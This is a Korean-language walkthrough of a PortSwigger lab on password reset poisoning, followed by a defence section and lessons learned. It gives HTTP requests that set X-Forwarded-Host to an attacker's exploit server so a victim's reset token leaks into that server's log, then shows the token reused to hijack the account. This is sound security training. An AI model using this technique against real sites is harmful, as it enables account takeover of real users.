# Lab: Password reset poisoning via middleware

## 개요

- **난이도**: Practitioner
- **주제**: Authentication — Password Reset Poisoning / `X-Forwarded-Host` 헤더 신뢰 / 재설정 토큰 탈취
- **링크**: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware

## 목표

비밀번호 재설정 링크가 `X-Forwarded-Host` 헤더 값으로 생성되는 점을 악용해, `carlos` 가 받는 재설정 링크를 공격자 서버로 향하게 만든다. 피해자가 링크를 클릭하면 토큰이 공격자 서버 로그에 남고, 이를 이용해 carlos 의 비밀번호를 재설정한다.

- 내 계정: `wiener:peter`
- 피해자: `carlos` (메일의 링크를 클릭함)

## 기초 개념 — 비밀번호 재설정과 Host 헤더

```
[정상 흐름]
  POST /forgot-password (username)
    → 서버가 재설정 토큰 생성
    → 이메일로 재설정 링크 전송
       https://실제도메인/forgot-password?temp-forgot-password-token=<TOKEN>

[링크의 호스트는 어떻게 결정되는가?]
  - 서버 설정값(정상)
  - 또는 요청의 Host / X-Forwarded-Host 헤더(취약)
```

```
[Password Reset Poisoning]
  공격자가 재설정 요청의 Host 관련 헤더를 조작
  → 서버가 그 값을 재설정 링크의 호스트로 사용
  → 피해자에게 발송되는 링크가 공격자 도메인을 가리킴
  → 피해자가 클릭하면 토큰이 공격자에게 전달됨
```

## 취약 지점

### 1. `X-Forwarded-Host` 를 신뢰

```
POST /forgot-password HTTP/1.1
Host: LAB-ID.web-security-academy.net
X-Forwarded-Host: EXPLOIT-SERVER-ID.exploit-server.net

username=carlos
```

미들웨어/프레임워크가 `X-Forwarded-Host` 를 링크 생성에 사용한다.
→ 생성된 재설정 링크:

```
https://EXPLOIT-SERVER-ID.exploit-server.net/forgot-password?temp-forgot-password-token=<CARLOS_TOKEN>
```

### 2. 토큰이 링크(쿼리)에 노출 + 피해자가 클릭

```
- 토큰이 URL 쿼리에 그대로 담김
- carlos 가 메일의 링크를 클릭
  → 공격자 서버로 GET 요청 + 토큰 전송
  → exploit server Access log 에 토큰 기록
```

### 3. 토큰이 사용자와 강하게 결합되지 않음

탈취한 토큰을 정상 도메인의 재설정 페이지에 넣으면 carlos 의 재설정이 진행된다.

## 공격 단계

### 1단계 — 재설정 기능 관찰

비밀번호 재설정을 요청하면 이메일로 고유 토큰이 담긴 링크가 발송됨을 확인한다.
`POST /forgot-password` 요청을 Burp Repeater 로 보낸다.

### 2단계 — X-Forwarded-Host 지원 확인

`X-Forwarded-Host` 값을 익스플로잇 서버 주소로 넣고 요청한다.

```
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

자기 계정으로 실험하면 이메일 링크가 익스플로잇 서버를 가리키는 것을 확인할 수 있다.

### 3단계 — carlos 로 재설정 요청

```
POST /forgot-password HTTP/1.1
Host: LAB-ID.web-security-academy.net
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded

username=carlos
```

carlos 에게 발송되는 링크가 익스플로잇 서버를 가리키게 된다.

### 4단계 — 토큰 탈취

익스플로잇 서버 **Access log** 에서 carlos 의 요청을 확인한다.

```
GET /forgot-password?temp-forgot-password-token=<CARLOS_TOKEN>
```

토큰을 기록한다.

### 5단계 — 토큰으로 비밀번호 재설정

자기 계정으로 받은 **정상 도메인**의 재설정 링크를 열고,
`temp-forgot-password-token` 값만 탈취한 토큰으로 바꾼다.

```
https://LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=<CARLOS_TOKEN>
```

새 비밀번호를 설정한다.

### 6단계 — carlos 로 로그인

새 비밀번호로 로그인 → 랩 해결.

## 관련 개념 — Host Header Attacks

```
이 취약점은 "Host 헤더/Host 파생 헤더 신뢰" 라는 더 큰 주제의 일부다.
  - Host
  - X-Forwarded-Host / X-Forwarded-Server
  - X-Host / X-Forwarded-For 등

영향:
  - 비밀번호 재설정 링크 조작(이번 랩)
  - 캐시 포이즈닝, 라우팅 우회, SSRF 등
```

## 방어

```
[근본 원인]
  재설정 링크의 호스트를 클라이언트가 제어하는 헤더에서 가져옴

[올바른 방어]
  1. 링크/URL 생성 시 신뢰할 수 있는 설정값 사용
     - 애플리케이션 설정에 정의된 정식(canonical) 도메인 사용
     - 요청 헤더(Host, X-Forwarded-Host 등)로 호스트를 만들지 않음
  2. 불가피하게 프록시를 거칠 때
     - 신뢰 경계의 프록시에서 Host/X-Forwarded-* 헤더를 덮어쓰기
     - 화이트리스트 검증 (허용된 호스트만)
  3. 토큰 보안 강화
     - 토큰을 URL 쿼리에 노출하지 않거나, 클릭 시 자동 처리하지 않도록 설계
     - 토큰을 사용자 세션과 결합(다른 사용자가 재사용 못 하게)
     - 짧은 만료, 일회용(사용 후 무효화)
  4. 재설정 요청 rate limiting, 사용자 알림
  5. 재설정 후 기존 세션 무효화

[주의]
  "Host 헤더는 클라이언트가 보낸다" 는 사실을 항상 기억한다.
  이메일/외부로 나가는 링크의 호스트를 요청 헤더에서 유도하면 안 된다.
```

## 핵심 정리

- 재설정 링크가 `X-Forwarded-Host` 값으로 생성되어, 그 헤더를 익스플로잇 서버로 지정하면 carlos 의 링크가 공격자 도메인을 가리켰다.
- carlos 가 링크를 클릭하면서 재설정 토큰이 익스플로잇 서버 Access log 에 유출됐다.
- 탈취한 토큰을 정상 도메인의 재설정 페이지에 넣어 carlos 의 비밀번호를 변경하고 로그인했다.
- 방어는 링크 호스트를 설정값(정식 도메인)에서 결정하고, Host/x-forwarded 계열 헤더를 신뢰하지 않는 것이다.

## 배운 점

- 비밀번호 재설정은 "링크 생성 + 토큰 전달" 이라는 외부 채널을 포함하므로, 링크의 호스트 결정 로직이 중요한 공격 표면이다.
- 요청 헤더로 외부 발송 링크를 만들면 Host header poisoning 이 성립한다.
- 003(토큰 미검증), 011(토큰 탈취)은 모두 재설정 로직의 결함이 계정 탈취로 이어지는 사례다.
- 토큰이 URL 쿼리에 노출되고 사용자와 결합되지 않으면, 유출 시 그대로 재사용된다.
